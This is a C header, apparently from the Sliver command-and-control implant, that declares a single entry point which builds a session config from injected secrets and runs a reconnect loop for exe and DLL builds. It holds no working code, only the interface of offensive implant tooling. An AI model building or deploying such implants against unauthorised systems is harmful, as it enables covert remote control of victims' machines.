/* sliver/implant.h - shared session entry point for exe and DLL artifacts. */
#ifndef SLIVER_IMPLANT_H
#define SLIVER_IMPLANT_H

#ifdef __cplusplus
extern "C" {
#endif

/* Builds the session config from the injected secrets and runs the reconnect
 * loop. argv0 is the process image name reported in the register message (may be
 * NULL for a loaded DLL). Returns 0 on a clean exit, non-zero on failure. */
int sliver_implant_run(const char *argv0);

#ifdef __cplusplus
}
#endif

#endif /* SLIVER_IMPLANT_H */
